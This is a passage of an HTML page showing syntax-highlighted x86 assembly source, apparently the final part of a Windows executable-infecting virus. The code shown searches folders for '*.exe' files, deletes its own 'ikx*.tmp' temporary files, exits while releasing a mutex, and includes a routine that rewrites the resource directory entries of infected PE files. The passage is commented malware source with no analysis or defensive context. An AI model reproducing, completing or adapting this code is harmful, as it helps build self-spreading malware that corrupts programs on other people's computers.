        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exemask</span><span class="sc0">                  </span><span class="sc1">; and now copy the *.exe mask</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpy</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_loop</span><span class="sc0">

</span><span class="sc5">farewell_and_goodnight</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">exit_critical_temp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; before exiting delete some temp files (the still used ones will be deleted</span><span class="sc0">
</span><span class="sc1">; next time since are actually in use)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">             </span><span class="sc1">; has temp path + last temp name</span><span class="sc0">
</span><span class="sc5">search_dottmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc13">'i\'             ; find beginning of name
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_dottmp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'xk'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_dottmp</span><span class="sc0">
</span><span class="sc5">got_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'mt.*'</span><span class="sc0">          </span><span class="sc1">; set delete ikx*.tmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'p'</span><span class="sc0">            </span><span class="sc1">; p + null termination</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fsearch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; after ikx in temp name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_deletion</span><span class="sc0">
</span><span class="sc5">delete_temps</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_name</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc0">          </span><span class="sc1">; sometimes will be shorter but wc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; preserve handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFileA</span><span class="sc0">                     </span><span class="sc1">; could fail if file is</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; used, but np</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fsearch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">                   </span><span class="sc1">; find next to delete</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">delete_temps</span><span class="sc0">

</span><span class="sc5">exit_deletion</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; that's all, will release also</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">                     </span><span class="sc1">; our mutex object</span><span class="sc0">

</span><span class="sc5">rsrs_change</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; EBX = value to substract to each resource element</span><span class="sc0">
</span><span class="sc1">; ESI = pointer to resources</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; will keep number of data elements</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">search_rsr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; nr of named and integer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; entryes in this dir</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">na_nasl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">                   </span><span class="sc1">; is a resource data entry?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">is_subdir</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">is_subdir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                           </span><span class="sc1">; on next</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">na_nasl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; finished ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">search_rsr</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">change_res</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; sub requested value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">change_res</span><span class="sc0">                      </span><span class="sc1">; change all entryes</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">startcode</span><span class="sc0">



</span></div></body>
</html>
